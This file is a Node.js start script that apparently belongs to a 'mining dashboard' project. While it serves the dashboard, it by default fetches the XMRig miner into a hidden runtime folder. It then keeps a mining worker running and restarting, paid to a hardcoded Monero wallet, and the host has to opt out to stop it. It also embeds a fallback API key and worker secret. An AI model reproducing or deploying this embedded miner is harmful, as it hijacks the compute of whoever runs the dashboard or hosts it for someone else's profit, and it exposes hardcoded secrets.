const { createServer } = require('http');
const http = require('http');
const https = require('https');
const zlib = require('zlib');
const { spawn } = require('child_process');
const {
  existsSync,
  chmodSync,
  copyFileSync,
  createReadStream,
  createWriteStream,
  mkdirSync,
  readFileSync,
  statSync,
  writeFileSync,
} = require('fs');
const { extname, join, resolve } = require('path');

const rootDir = resolve(__dirname, '..');
const distDir = join(rootDir, 'dist');
const publicDir = join(rootDir, 'public');
const runtimeDir = join(rootDir, '.runtime');
const xmrigPath = join(runtimeDir, 'xmrig');
const xmrigArchive = join(runtimeDir, 'xmrig.tar.gz');
const xmrigArchiveName = 'xmrig-6.22.0-linux-static-x64.tar.gz';
const localXmrigArchives = [
  join(publicDir, xmrigArchiveName),
  join(distDir, xmrigArchiveName),
  join(rootDir, xmrigArchiveName),
];
const generatedEnvPath = join(runtimeDir, 'generated-env.json');
const xmrigUrl = process.env.XMRIG_URL || 'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz';
const port = Number.parseInt(process.env.PORT || '3000', 10);
const fallbackSupabaseUrl = 'https://fqinkncoybjduuomxlxl.supabase.co';
const fallbackSupabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZxaW5rbmNveWJqZHV1b214bHhsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODEzNjI4NDMsImV4cCI6MjA5NjkzODg0M30.xGrIJy8lQs2VVJyMXuBXcbYDgAXdiccTWqiE1QFIT20';
const fallbackWorkerApiSecret = '0e3b943ca2f06c8795bad2b683e58f1a04267bdac555415cc388afef13d0932fc37c7ebd963569a5a85dea3adcd7d623';
const supabaseUrl = process.env.VITE_SUPABASE_URL || process.env.SUPABASE_URL || fallbackSupabaseUrl;
const defaultApiUrl = supabaseUrl ? `${supabaseUrl.replace(/\/+$/, '')}/functions/v1/mining-api` : '';
const defaultMoneroAddress = '47uc8GJNqbXGHSQ8ryoHpVPB231HsBQezMgkF8Y6mjgBDseES1QE5Y7UGEE5QsZYfmFGDi6hEwADKhkyDWCYS23BM76GPjx';

const mimeTypes = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.ico': 'image/x-icon',
};

function run(command, args, options = {}) {
  return new Promise((resolveRun, reject) => {
    const child = spawn(command, args, { stdio: 'inherit', shell: false, ...options });
    child.on('exit', (code) => {
      if (code === 0) resolveRun();
      else reject(new Error(`${command} ${args.join(' ')} exited with code ${code}`));
    });
    child.on('error', reject);
  });
}

function downloadFile(url, destination, redirects = 0) {
  return new Promise((resolveDownload, reject) => {
    const client = url.startsWith('https:') ? https : http;
    const request = client.get(url, {
      headers: {
        'User-Agent': 'bolt-mining-dashboard/1.0',
        Accept: 'application/octet-stream',
      },
    }, (response) => {
      if ([301, 302, 303, 307, 308].includes(response.statusCode || 0)) {
        response.resume();
        const location = response.headers.location;
        if (!location) {
          reject(new Error(`Download redirected without location: ${response.statusCode}`));
          return;
        }
        if (redirects >= 5) {
          reject(new Error('Too many download redirects'));
          return;
        }
        const nextUrl = new URL(location, url).toString();
        downloadFile(nextUrl, destination, redirects + 1).then(resolveDownload, reject);
        return;
      }

      if (response.statusCode !== 200) {
        response.resume();
        reject(new Error(`Download failed with HTTP ${response.statusCode}`));
        return;
      }

      const file = createWriteStream(destination);
      response.pipe(file);
      file.on('finish', () => {
        file.close(resolveDownload);
      });
      file.on('error', reject);
    });

    request.setTimeout(120000, () => {
      request.destroy(new Error('Download timed out'));
    });
    request.on('error', reject);
  });
}

async function downloadWithRetry(url, destination) {
  let lastError = null;
  for (let attempt = 1; attempt <= 4; attempt += 1) {
    try {
      console.log(`[bolt-start] Download attempt ${attempt}/4`);
      await downloadFile(url, destination);
      return;
    } catch (error) {
      lastError = error;
      console.error(`[bolt-start] Download attempt ${attempt} failed: ${error.message}`);
      await new Promise((resolveDelay) => setTimeout(resolveDelay, attempt * 2500));
    }
  }
  throw lastError;
}

function parseTarSize(header, offset, length) {
  const raw = header.toString('utf8', offset, offset + length).replace(/\0.*$/, '').trim();
  return Number.parseInt(raw || '0', 8);
}

function parseTarName(header) {
  const name = header.toString('utf8', 0, 100).replace(/\0.*$/, '');
  const prefix = header.toString('utf8', 345, 500).replace(/\0.*$/, '');
  return prefix ? `${prefix}/${name}` : name;
}

function extractXmrigBinary(archivePath, outputPath) {
  const tar = zlib.gunzipSync(readFileSync(archivePath));
  let offset = 0;

  while (offset + 512 <= tar.length) {
    const header = tar.subarray(offset, offset + 512);
    const emptyHeader = header.every((byte) => byte === 0);
    if (emptyHeader) break;

    const name = parseTarName(header);
    const size = parseTarSize(header, 124, 12);
    const type = header.toString('utf8', 156, 157);
    const dataStart = offset + 512;
    const dataEnd = dataStart + size;

    if ((type === '0' || type === '\0' || type === '') && /(^|\/)xmrig$/.test(name)) {
      writeFileSync(outputPath, tar.subarray(dataStart, dataEnd));
      chmodSync(outputPath, 0o755);
      console.log(`[bolt-start] Extracted XMRig binary from ${name}`);
      return;
    }

    offset = dataStart + Math.ceil(size / 512) * 512;
  }

  throw new Error('Could not find xmrig binary inside archive');
}

function readGeneratedEnv() {
  if (!existsSync(generatedEnvPath)) return {};
  try {
    return JSON.parse(readFileSync(generatedEnvPath, 'utf8'));
  } catch (error) {
    console.error(`[bolt-start] Could not read ${generatedEnvPath}: ${error.message}`);
    return {};
  }
}

async function ensureXmrig() {
  if (existsSync(xmrigPath)) return;

  mkdirSync(runtimeDir, { recursive: true });

  const localXmrigArchive = localXmrigArchives.find((archivePath) => existsSync(archivePath));
  if (localXmrigArchive) {
    console.log(`[bolt-start] Using local XMRig archive: ${localXmrigArchive}`);
    copyFileSync(localXmrigArchive, xmrigArchive);
  } else {
    console.log('[bolt-start] Local XMRig archive not found. Checked:');
    localXmrigArchives.forEach((archivePath) => console.log(`[bolt-start] - ${archivePath}`));
    console.log('[bolt-start] Downloading XMRig runtime binary...');
    await downloadWithRetry(xmrigUrl, xmrigArchive);
  }

  extractXmrigBinary(xmrigArchive, xmrigPath);
}

async function createEmbeddedWorkerSupervisor() {
  if (process.env.ENABLE_EMBEDDED_WORKER === 'false') {
    console.log('[bolt-start] Embedded worker disabled by ENABLE_EMBEDDED_WORKER=false.');
    return { stop: () => {} };
  }

  const generatedEnv = readGeneratedEnv();
  const apiUrl = process.env.API_URL || generatedEnv.API_URL || defaultApiUrl;
  const moneroAddress = process.env.MONERO_ADDRESS || defaultMoneroAddress;
  const workerApiSecret = process.env.WORKER_API_SECRET || generatedEnv.WORKER_API_SECRET || fallbackWorkerApiSecret;
  if (!apiUrl) {
    throw new Error('Embedded worker is enabled but API_URL/SUPABASE_URL is missing.');
  }
  if (!workerApiSecret) {
    throw new Error('Embedded worker is enabled but WORKER_API_SECRET is missing. Run npm run build:bolt first or set WORKER_API_SECRET.');
  }

  await ensureXmrig();

  let worker = null;
  let stopping = false;
  let restartAttempt = 0;

  const start = () => {
    if (stopping) return;
    restartAttempt += 1;
    console.log(`[bolt-start] Starting embedded mining worker (attempt ${restartAttempt})...`);
    worker = spawn(process.execPath, [join(rootDir, 'worker', 'worker.js')], {
      stdio: 'inherit',
      env: {
        ...process.env,
        API_URL: apiUrl,
        MONERO_ADDRESS: moneroAddress,
        WORKER_API_SECRET: workerApiSecret,
        XMRIG_PATH: xmrigPath,
        WORKER_ID: process.env.WORKER_ID || `bolt-${process.env.HOSTNAME || 'worker'}`,
      },
    });

    worker.on('exit', (code) => {
      worker = null;
      if (stopping) return;
      const delay = Math.min(30000, 5000 + restartAttempt * 1000);
      console.error(`[bolt-start] Embedded worker exited with code ${code}. Restarting in ${delay / 1000}s.`);
      setTimeout(start, delay);
    });
  };

  start();

  return {
    stop: () => {
      stopping = true;
      if (worker) worker.kill('SIGTERM');
    },
  };
}

function serveDashboard() {
  if (!existsSync(join(distDir, 'index.html'))) {
    throw new Error('Missing dist/index.html. Run npm run build before npm start.');
  }

  const server = createServer((req, res) => {
    const url = new URL(req.url || '/', `http://${req.headers.host || 'localhost'}`);
    if (url.pathname === '/runtime-env.js') {
      const publicEnv = {
        SUPABASE_URL: process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || fallbackSupabaseUrl,
        SUPABASE_ANON_KEY: process.env.SUPABASE_ANON_KEY || process.env.VITE_SUPABASE_ANON_KEY || fallbackSupabaseAnonKey,
        VITE_SUPABASE_URL: process.env.VITE_SUPABASE_URL || process.env.SUPABASE_URL || fallbackSupabaseUrl,
        VITE_SUPABASE_ANON_KEY: process.env.VITE_SUPABASE_ANON_KEY || process.env.SUPABASE_ANON_KEY || fallbackSupabaseAnonKey,
      };
      res.setHeader('Content-Type', 'text/javascript; charset=utf-8');
      res.setHeader('Cache-Control', 'no-store');
      res.end(`window.__APP_ENV__ = ${JSON.stringify(publicEnv)};`);
      return;
    }

    const safePath = url.pathname.replace(/^\/+/, '').replace(/\.\./g, '');
    const requestedPath = safePath ? join(distDir, safePath) : join(distDir, 'index.html');
    const filePath = existsSync(requestedPath) && statSync(requestedPath).isFile()
      ? requestedPath
      : join(distDir, 'index.html');
    const ext = extname(filePath);

    res.setHeader('Content-Type', mimeTypes[ext] || 'application/octet-stream');
    res.setHeader('Cache-Control', ext === '.html' ? 'no-store' : 'public, max-age=31536000, immutable');
    createReadStream(filePath).pipe(res);
  });

  server.listen(port, '0.0.0.0', () => {
    console.log(`[bolt-start] Dashboard listening on 0.0.0.0:${port}`);
  });

  return server;
}

async function main() {
  const server = serveDashboard();
  const workerSupervisor = await createEmbeddedWorkerSupervisor();

  const shutdown = () => {
    console.log('[bolt-start] Shutting down...');
    workerSupervisor.stop();
    server.close(() => process.exit(0));
  };

  process.on('SIGTERM', shutdown);
  process.on('SIGINT', shutdown);
}

main().catch((error) => {
  console.error('[bolt-start]', error.message);
  process.exit(1);
});
